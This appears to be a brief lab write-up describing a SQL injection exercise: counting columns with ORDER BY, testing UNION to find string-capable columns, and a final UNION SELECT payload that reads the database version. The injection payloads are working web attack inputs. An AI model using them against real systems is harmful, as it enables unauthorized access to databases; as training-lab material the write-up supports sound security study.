To solve this lab I used `order by 1#` to determine number of columns<br>
Then I used to test `union attack` to determine which of the columns can hold **string** data.

Then for final payload I used:
```bash
' UNION SELECT @@version, NULL#
```
